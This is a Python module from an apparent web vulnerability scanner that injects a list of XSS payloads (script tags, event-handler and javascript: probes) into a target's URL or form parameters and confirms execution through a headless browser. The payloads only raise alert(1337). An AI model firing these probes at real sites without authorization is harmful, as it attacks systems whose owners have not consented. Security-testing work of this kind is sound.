from awap.engines.attack.base import AttackModule
import httpx
from playwright.async_api import async_playwright

class XSSDOMModule(AttackModule):
    module_id = "xss_dom"
    vuln_class = "XSS_DOM"

    # Minimal polymorphic payloads meant to bypass common superficial filters
    PAYLOADS = [
        "'\"><script>alert(1337)</script>",
        "\" autofocus onfocus=alert(1337)//",
        "</script><svg/onload=alert(1337)>",
        "javascript:alert(1337)//",
        "'-alert(1337)-'"
    ]

    async def run(self, target_url: str, params: list[dict], context=None) -> list[dict]:
        findings = []

        for param in params:
            for payload in self.PAYLOADS:
                test_url = target_url
                param_name = param.get("name", "")
                param_type = param.get("type", "url_param")
                
                if param_type == "url_param":
                    sep = "&" if "?" in test_url else "?"
                    test_url = f"{test_url}{sep}{param_name}={payload}"
                
                try:
                    # Quick HTTP fetch to check reflection (via custom RAE if context is available)
                    if context:
                        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                            if param_type == "url_param":
                                response = await client.get(test_url)
                            else:
                                response = await client.post(target_url, data={param_name: payload})
                        
                        analysis = self.analyze_with_rae(context, test_url, response, payload)
                        is_reflected = analysis.get("is_vulnerable", False) or "DIRECT_REFLECTION_FOUND" in analysis.get("evidence", [])
                    else:
                        is_reflected = True  # Fallback to direct verification if no context
                    
                    if is_reflected:
                        # Verify execution via Playwright
                        method = "GET" if param_type == "url_param" else "POST"
                        executed = await self._verify_execution_via_browser(test_url, method, param_name, payload)
                        if executed:
                            findings.append({
                                "vuln_class": "XSS_DOM",
                                "url": target_url,
                                "method": method,
                                "param": param_name,
                                "parameter_type": param_type.upper(),
                                "payload": payload,
                                "evidence": f"XSS executed in browser context using payload: {payload}",
                                "severity": "HIGH",
                                "cvss": 7.5,
                                "confidence": 0.99,
                                "confirmed": True,
                                "request_raw": f"{method} {test_url}",
                                "response_raw": "Headless browser confirmed execution via alert(1337)",
                            })
                            break  # Found working payload for this param, move to next param
                            
                except Exception:
                    pass
                    
        return findings

    async def _verify_execution_via_browser(self, test_url: str, method: str, param_name: str, payload: str) -> bool:
        """
        Uses Playwright to physically load the payloaded page and listen for the `dialog` event
        to absolutely confirm real DOM XSS execution without false positives.
        """
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)
            page = await context.new_page()
            
            # Watchdog for malicious alert explosion
            xss_triggered = False
            async def handle_dialog(dialog):
                nonlocal xss_triggered
                if dialog.message == "1337" or dialog.type == "alert":
                    xss_triggered = True
                await dialog.dismiss()

            page.on("dialog", handle_dialog)
            
            try:
                if method.upper() == "GET":
                    await page.goto(test_url, wait_until="load", timeout=5000)
                else:
                    # Execute a scripted POST request
                    await page.route("**/*", lambda route: route.continue_(
                        method="POST",
                        post_data=f"{param_name}={payload}",
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    ) if route.request.url == test_url else route.continue_())
                    await page.goto(test_url, wait_until="load", timeout=5000)
                    
            except Exception:
                pass
            finally:
                await browser.close()
                
            return xss_triggered
